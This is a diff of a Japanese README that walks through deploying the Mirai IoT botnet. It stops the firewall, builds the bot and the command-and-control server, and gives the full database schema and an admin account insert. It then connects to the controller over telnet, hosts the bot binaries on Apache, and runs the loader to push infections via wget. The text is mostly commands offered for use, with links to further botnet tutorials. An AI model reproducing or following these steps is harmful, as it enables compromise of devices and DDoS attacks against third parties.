@@ -38,10 +38,12 @@ https://gist.github.com/ppoffice/86beb0f90de5aeec75aabd517ebc5e43
 
 [English(英語)](README.md)
 
-※rootでログインしていない場合は、なるべくsudoをコマンドの先頭に追加して、以下のインストール手順にしたがってください。<br />
-※インストールできない場合は、以下のURLを参照してインストールしてください。<br />
-https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
-https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br />
+※rootでログインしていない場合は、なるべくsudoをコマンドの先頭に追加して、以下のインストール手順にしたがってください。<br>
+※インストールできない場合は、以下のURLを参照してインストールしてください。<br>
+https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
+https://www.youtube.com/watch?v=G4vUp3ydjs0 <br>
+https://www.youtube.com/watch?v=nz_6ayGosxo <br>
 
 ```
 # sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
@@ -106,47 +108,74 @@ miraiディレクトリに移動して、`build.sh`を実行します。
 ```
 # sudo service iptables stop
 ```
-データベースの設定！<br />
-※パスワードの設定を求められますので、必ず覚えておいてください。
+データベースの設定！<br>
+次にmysqlにユーザーとテーブルを追加します。
 ```
-# sudo /usr/bin/mysql_secure_installation
+# cd release
+# sudo mysql -u root -p
+Enter Password: root
+> create database mirai;
+> use mirai
 ```
-`cd cnc/`で移動し、先ほど入力したrootパスワードをmain.goを開いてMySQL_Passwordから置き換えてください。
+ここまで入力してたら、ここから
 ```
-const DatabaseAddr string   = "127.0.0.1:3306"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "MySQL_Password"
-const DatabaseTable string  = "mirai"
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
 ```
-次にmysqlにユーザーを追加します。
+ここまでコピーしてmysqlプロンプトに貼り付けてください。<br>
+Enterを押した後、以下のコマンドを入力します。
 ```
-# cd ../../scripts
-# cat db.sql | sudo mysql -uroot -pMySQL_Password
+> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
+> exit
 # sudo service mysql restart
 ```
-mysqlサーバーを再起動したら、リリースディレクトリ(`./mirai/release`)に移動し、cncというコンパイルされたファイルを実行します。
-```
-# cd ../mirai/release
-# sudo ./cnc
-```
-次に、新しいウィンドウを開き(もとソースでは新しいウィンドウを開くこと書いてなかったけどま、いいか)、次のコマンドを実行します。
+mysqlサーバを再起動した後、botを再度コンパイルし、releaseディレクトリに移動してコンパイルしたファイルcncを実行します。
 ```
 # cd ..
+# ./build.sh release telnet
 # cp prompt.txt release/
+# cd release
+# sudo ./cnc
 ```
-次に、telnetで自分のIPアドレスに接続します。<br />
+次に、新しいプロンプトを開き、ボットをコンパイルした方のIPアドレスにtelnetで接続します。
 以下は、telnetコマンドの実行例です。
 ```
 # telnet 192.168.19.19
 ```
-OK、ではこのユーザー名とパスワードでログインしてください。この場合、ユーザー名は `tashiro` で、パスワードは `mystrongestpassword` です。
-
-もう一度、Puttyやmobaxtermのようなサーバーターミナルを使用してください。<br />
-このディレクトリに移動します ../Mirai-Source-Code-plus/mirai/release
-```
-# cd Mirai-Source-Code-plus/mirai/release
-```
-次に、Apacheサーバーをインストールし、起動します。
+OK、ではこのユーザー名とパスワードでログインしてください。この場合、ユーザー名は `tashiro` で、パスワードは `mystrongestpassword` です。<br><br>
+再度新しいプロンプトを開き、Apache2をインストールし、起動します。
 ```
 # sudo apt install apache2
 # sudo service apache2 start
@@ -184,15 +213,15 @@ done
 
 rm -f "
 ```
-vpsをお持ちの方は、`/var/www/html`をsftpでアップロードしてください。<br />
-※vpsをお持ちでない方は、そのままで結構です。<br />
+vpsをお持ちの方は、`/var/www/html`をsftpでアップロードしてください。<br>
+※vpsをお持ちでない方は、そのままで結構です。<br>
 本当にアップロードされたかどうかは、私の自身vpsとかあまり詳しくないので、ご自身でお確かめください。
 
 ここで、Apacheサーバーを再起動します。
 ```
 # sudo service apache2 restart
 ```
-次に、`loader`をビルドするために、`Mirai-Source-Code-plus/loader/`に移動し、`loader`をビルドします。<br />
+次に、`loader`をビルドするために、`Mirai-Source-Code-plus/loader/`に移動し、`loader`をビルドします。<br>
 ※移動コマンド省略します。
 ```
 # chmod +x build.sh
@@ -202,13 +231,14 @@ vpsをお持ちの方は、`/var/www/html`をsftpでアップロードしてく�
 ```
 # cat file.txt | ./loader wget http://dyn.com
 ```
-これでインストールは完了です :)<br />
-お疲れ様でした。一息ついて、コーヒーでも飲んでください。<br />
+これでインストールは完了です :)<br>
+お疲れ様でした。一息ついて、コーヒーでも飲んでください。<br>
 ※小学生はコーヒーではなくジュースを飲んで一息ついてください。
 
 ### 参考資料
-https://github.com/jgamblin/Mirai-Source-Code <br />
-https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
-https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br />
+https://github.com/jgamblin/Mirai-Source-Code <br>
+https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
+https://www.youtube.com/channel/UCXM4xUOmJk3Px2qiG9x1ygg/videos <br>
 
 英語での翻訳はDeepLですが、おかしなところがあるのでそこは温かい目でよろしくお願いします。
